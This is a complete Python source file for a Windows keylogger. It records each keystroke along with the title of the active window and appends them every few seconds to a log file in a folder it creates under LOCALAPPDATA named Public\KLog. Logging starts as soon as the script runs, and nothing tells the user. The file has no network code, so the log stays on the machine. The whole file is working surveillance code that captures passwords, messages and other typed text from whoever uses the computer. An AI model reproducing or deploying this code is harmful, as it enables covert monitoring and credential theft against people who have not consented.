import datetime
import os
from pynput.keyboard import Key, Listener
from threading import Thread
import time
import win32gui

class KeyLogger:

    def __init__(self, delay_in_seconds:int, log_file_path:str):
        self.exceptions = [
            Key.shift,
            Key.shift_l,
            Key.shift_r,
            Key.caps_lock,
            Key.ctrl,
            Key.ctrl_l,
            Key.ctrl_r,
            Key.esc
        ]
        self.replace = {
            Key.space:' '
        }
        self.key_pressed_after_changing_window = True
        self.log_string = f"Start{time.time()}\n"
        self.delay = delay_in_seconds
        self.running = False
        self.save_location = log_file_path
        self.last_app = ""
        self.app_listener_delay = 3
        self.last = 0
        self.listener = Listener(on_release=self.on_release)
        self.backup = Thread(target=self.__backup__)
        self.app_listener = Thread(target=self.__app_listener__)

    def run(self):
        self.running = True
        self.app_listener.start()
        self.listener.start()
        self.backup.start()

    def on_release(self, key):
        if not key in self.exceptions:
            self.key_pressed_after_changing_window = True
            key_name = key.char if hasattr(key, 'char') else str(key)
            if key in self.replace:
                key_name = self.replace[key]
            now = time.time()
            NOW = ''
            if now > self.last + 60:
                NOW = '\n['+ time.strftime('%Y-%m-%d %H:%M:%S',time.localtime()) + '] '
                self.last = now
            if 'Key' in key_name:
                key_name = '{' + key_name + '}'
            self.log(f"{NOW}{key_name}")

    def is_dead(self):
        return not (
            self.app_listener.is_alive() or
            self.listener.is_alive() or
            self.backup.is_alive()
        )

    def log(self,text:str):
        self.log_string += text

    def __backup__(self):
        while self.running:
            time.sleep(self.delay)
            file = open(self.save_location,'ab')
            try:
                file.write(self.log_string.encode("utf-8"))
                file.flush()
            finally:
                file.close()
                self.log_string = ''

    def __app_listener__(self):
        last = ''
        while self.running:
            
            time.sleep(self.app_listener_delay)
            if self.key_pressed_after_changing_window:
                window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if not window_title.strip():
                    window_title = "{no title}"
                if window_title != last:
                    self.log("\nWindow Changed: " + window_title+'\n')
                last = window_title
                self.key_pressed_after_changing_window = True
user_folder = os.getenv("LOCALAPPDATA")
app_folder = os.path.join(user_folder, "Public", "KLog")
os.makedirs(app_folder, exist_ok=True)
os.chdir(app_folder)
logger = KeyLogger(5,os.path.join(app_folder,"keys.log"))
logger.run()